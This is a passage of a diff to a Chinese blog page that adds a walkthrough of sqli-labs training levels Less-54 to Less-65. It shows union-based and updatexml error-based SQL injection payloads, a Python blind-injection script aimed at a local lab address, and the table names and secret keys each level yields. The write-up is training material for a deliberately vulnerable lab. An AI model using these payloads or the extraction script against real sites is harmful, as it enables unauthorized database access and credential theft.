class="hljs-type">time</span>.time()<br>        elapsed_time = end_time - start_time<br><br>        <span class="hljs-keyword">if</span> elapsed_time &gt; <span class="hljs-number">3</span>:<br>            <span class="hljs-type">name</span> += chr(i)<br>            print(<span class="hljs-type">name</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-26_21-03-33.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-26_21-03-33"></p>
+<h3 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h3><p>本关为限定次数的联合查询。闭合是<code>&#39;&#39;</code>。限定10次。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">8</span>l6dhmhnx7    //自动生成的表名<br><br>id,sessid,secret_IXLP,tryy  //固定的表中的字段名<br><br><span class="hljs-number">1</span>cfa7fe86ff0b4a0dafcd7a69ae41fecc~citJhq3EfrIsFy303G57AJcE4  //自动生成的表中内容<br><br><br><br>//联合查询语句<br><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- -    //查询当前库的所有的表名</span><br><br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- -  //查询users表中所有的列名</span><br><br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">-- -  //查询users表中的对应字段名 </span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_10-43-03.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_10-43-03"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_10-48-45.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_10-48-45"></p>
+<p>最后将生成的密钥输入key输入框。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_10-53-42.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_10-53-42"></p>
+<p>正确。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_10-54-18.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_10-54-18"></p>
+<p>错误结果。</p>
+<h3 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h3><p>和less-54基本一致，只是闭合变成了<code>()</code>,能单词使用的次数变成了14次。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><br>ukjxs<span class="hljs-name">g8</span><span class="hljs-name">m0</span>i  <span class="hljs-comment">//自动生成的表名</span><br><br>id,sessid,secret_AIGT,tryy<br><br><span class="hljs-number">13</span>faebb<span class="hljs-number">27540633</span>c<span class="hljs-number">9</span>d<span class="hljs-number">2065</span>e<span class="hljs-number">5131</span>ddf<span class="hljs-number">2</span>a<span class="hljs-number">5</span>~<span class="hljs-number">04</span>Zd<span class="hljs-symbol">NwpAEyxjizTMK6</span>mIusHS<span class="hljs-number">5</span><br><br><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-06-07.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-06-07"></p>
+<p>输入密钥。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-06-41.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-06-41"></p>
+<h3 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h3><p>本关使用<code>(&#39;&#39;)</code>闭合。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">5d8ob5wuby</span><br><br><span class="hljs-attribute">id</span>,sessid,secret_JV6X,tryy<br><br><span class="hljs-attribute">11ee942c6b182d0f041a2312947385b23</span>~<span class="hljs-number">4</span>U1jBHOvvEV4uF6zBsZqV76F4<br><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-14-04.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-14-04"></p>
+<h3 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h3><p>本关闭合是<code>&quot;&quot;</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-15-52.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-15-52"></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">30</span>a5tu6yhz<br><br><span class="hljs-built_in">id</span>,sessid,secret_OBOE,tryy<br><br><span class="hljs-number">1585</span>c39030ac94772e31e017b758e2fcb~TBerrGIUS7R4HEX3rplgfPnA5<br><br><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-18-51.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-18-51"></p>
+<h3 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h3><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-25-00.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-25-00"></p>
+<p>看代码发现本页面会输出报错，且闭合为<code>&#39;&#39;</code>。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">爆库<br><span class="hljs-number">0</span>&#x27; <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">0</span>x7e),)<span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-30-33.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-30-33"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">爆表<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br><br><span class="hljs-number">49</span>murs2ybt  //表名<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-36-45.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-36-45"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">爆列<br>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;49murs2ybt&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br><br>id,sessid,secret_ZNZ4,tryy  //列名<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-40-18.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-40-18"></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">0&#x27;</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">secret_ZNZ4</span>) <span class="hljs-keyword">from</span> 49murs2ybt)),0x7e),1))-- -</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">MAGOQLzzN0JW8WInYn2JIwYe  <span class="hljs-comment">//密码</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-41-56.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-41-56"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_11-42-25.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_11-42-25"></p>
+<h3 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h3><p>本关没有闭合。和less-58一致。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode">s<span class="hljs-number">4</span>a<span class="hljs-number">953</span>z<span class="hljs-number">4</span>oy  <br><br>id,sessid,secret_<span class="hljs-name">G636</span>,tryy<br><br>ulzULZZ<span class="hljs-number">2</span>Ka<span class="hljs-name">M5</span>wDcCIYSCb<span class="hljs-number">4</span>VY<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_17-15-57.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_17-15-57"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_17-16-28.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_17-16-28"></p>
+<h3 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h3><p>本关闭合是<code>(&quot;&quot;)</code>。和less-58一致。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">67</span>xa<span class="hljs-number">68</span><span class="hljs-name">m1</span><span class="hljs-symbol">n0</span><br><br>id,sessid,secret_<span class="hljs-number">4</span>CA<span class="hljs-number">6</span>,tryy<br><br>tA<span class="hljs-number">18</span>KlvBTyAMSrjw<span class="hljs-number">9</span>TwpzPlQ<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231227172925810.png" srcset="/img/loading.gif" lazyload alt="image-20231227172925810"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231227172945470.png" srcset="/img/loading.gif" lazyload alt="image-20231227172945470"></p>
+<h3 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h3><p>本关的闭合是<code>((&#39;&#39;))</code>。和less-58一致。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">6607</span><span class="hljs-symbol">nm1</span>rq<span class="hljs-number">7</span><br><br>id,sessid,secret_AHMV,tryy<br><br>r<span class="hljs-number">9</span>bUx<span class="hljs-number">1</span>DQHIwr<span class="hljs-name">G5</span>ZXjFuT<span class="hljs-number">386</span>w<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimage-20231227190311827.png" srcset="/img/loading.gif" lazyload alt="image-20231227190311827"></p>
+<h3 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h3><p>本官只能使用布尔盲注或者是延时注入。本关的闭合时<code>(&#39;&#39;)</code>。</p>
+<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs verilog">盲注脚本<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">time</span><br>session = requests<span class="hljs-variable">.session</span>()<br>url = <span class="hljs-string">&quot;http://192.168.2.85/sqli/Less-62/?id=1&#x27;)&quot;</span><br><br><br><br>def db():<br>    name = &#x27;&#x27;<br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">begin</span> =<span class="hljs-number">32</span><br>        <span class="hljs-keyword">end</span> =<span class="hljs-number">128</span><br>        tmp = (<span class="hljs-keyword">begin</span>+<span class="hljs-keyword">end</span>)<span class="hljs-comment">//2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">begin</span> &lt; <span class="hljs-keyword">end</span> :<br>            paramsGet = url + <span class="hljs-string">&quot;/**/and/**/ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span><span class="hljs-variable">.format</span>(i,tmp)<br>            <br>            response = session<span class="hljs-variable">.get</span>(paramsGet)<br>            #You are in.... Use outfile......,You are in...........,../images/flag<span class="hljs-variable">.jpg</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name :&quot;</span> in response<span class="hljs-variable">.text</span>:<br>                <span class="hljs-keyword">begin</span> = tmp + <span class="hljs-number">1</span><br>                tmp = (<span class="hljs-keyword">begin</span>+<span class="hljs-keyword">end</span>)<span class="hljs-comment">//2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">end</span> = tmp<br>                tmp = (<span class="hljs-keyword">begin</span>+<span class="hljs-keyword">end</span>)<span class="hljs-comment">//2</span><br>        <span class="hljs-keyword">if</span>(tmp==<span class="hljs-number">32</span>):<br>            <span class="hljs-keyword">break</span><br>        name += chr(tmp)<br>        print(name)<br>db()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">v66w1xymh0<br><br><span class="hljs-built_in">id</span>,sessid,secret_9KU0,tryy<br><br><br>IPfkIxpqVx5Whc9C2IXwHOpR<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_19-54-29.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_19-54-29"></p>
+<h3 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h3><p>本关的闭合是<code>&#39;&#39;</code>。和less-62一致。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">ud3nvyvwg1<br><br><span class="hljs-built_in">id</span>,sessid,secret_64NG,tryy<br><br>pwgFMOKY3ibiHrjXmhSqHxEH<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_20-36-21.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_20-36-21"></p>
+<h3 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h3><p>本关的闭合是<code>(())</code>。和less-62一致。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br><br><br><br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-keyword">database</span>()<br><br><br><span class="hljs-keyword">select</span> group_concat(id,&quot;~&quot;,username,&quot;~&quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">jf9e2dj4cc<br><br><span class="hljs-built_in">id</span>,sessid,secret_YDQ0,tryy<br><br>tKF0AgVOiwpflqDWGkRXIX0Q<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_20-46-29.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_20-46-29"></p>
+<h3 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h3><p>本关的闭合是<code>(&quot;&quot;)</code>。和less-62一致。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br><br><br><br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-keyword">database</span>()<br><br><br><span class="hljs-keyword">select</span> group_concat(id,&quot;~&quot;,username,&quot;~&quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">73</span>bd0ua5nn<br><br><span class="hljs-built_in">id</span>,sessid,secret_5I4N,tryy<br><br>JXfi81zRs0PEsOmFw8jlMhLl<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgSnipaste_2023-12-27_20-51-09.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2023-12-27_20-51-09"></p>
 
                 
               </div>
@@ -502,6 +859,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/" title="网络渗透">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">网络渗透</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
